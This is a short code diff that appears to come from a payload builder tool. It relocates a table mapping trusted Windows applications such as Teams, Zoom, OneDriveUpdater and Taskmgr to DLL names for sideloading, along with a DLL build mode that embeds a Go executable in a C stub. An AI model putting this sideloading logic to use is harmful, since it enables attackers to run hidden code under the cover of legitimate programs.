@@ -1531,6 +1531,18 @@ func binderExec(outPath string, _ []byte) {
       const effectiveOs = isIosTarget ? "darwin" : os;
       const targetKey = `${effectiveOs}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
       const winExt = config.outputExtension || ".exe";
+      const isDllBuild = effectiveOs === "windows" && winExt === ".dll";
+      const SIDELOAD_DLL_MAP: Record<string, string> = {
+        "OneDriveUpdater.exe": "version.dll",
+        "MicrosoftEdgeUpdate.exe": "version.dll",
+        "Teams.exe": "CRYPTSP.dll",
+        "Zoom.exe": "version.dll",
+        "PhoneExperienceHost.exe": "version.dll",
+        "Taskmgr.exe": "version.dll",
+      };
+      const sideloadDllName = isDllBuild && config.sideloadTarget
+        ? SIDELOAD_DLL_MAP[config.sideloadTarget] ?? null
+        : null;
       const buildSlug = buildId.substring(0, 8);
       let namePrefix: string;
       if (config.randomizeOutputName && !config.outputName) {
@@ -1985,20 +1997,6 @@ func binderExec(outPath string, _ []byte) {
         // environment-isolation contract.
         baseTags = enforceBuilderReleaseTag(baseTags);
 
-        // isDllBuild with sideloadDllName = C stub path (Go built as EXE, embedded in C DLL)
-        // isDllBuild without sideloadDllName = pure Go -buildmode=c-shared (fallback)
-        const isDllBuild = effectiveOs === "windows" && winExt === ".dll";
-        const SIDELOAD_DLL_MAP: Record<string, string> = {
-          "OneDriveUpdater.exe": "version.dll",
-          "MicrosoftEdgeUpdate.exe": "version.dll",
-          "Teams.exe": "CRYPTSP.dll",
-          "Zoom.exe": "version.dll",
-          "PhoneExperienceHost.exe": "version.dll",
-          "Taskmgr.exe": "version.dll",
-        };
-        const sideloadDllName = isDllBuild && config.sideloadTarget
-          ? SIDELOAD_DLL_MAP[config.sideloadTarget] ?? null
-          : null;
         const runBuild = async (tags: string[], outputPath: string) => {
           // C stub path: Go built as normal EXE, embedded inside C DLL
           // Pure Go DLL path (no sideloadTarget): -buildmode=c-shared
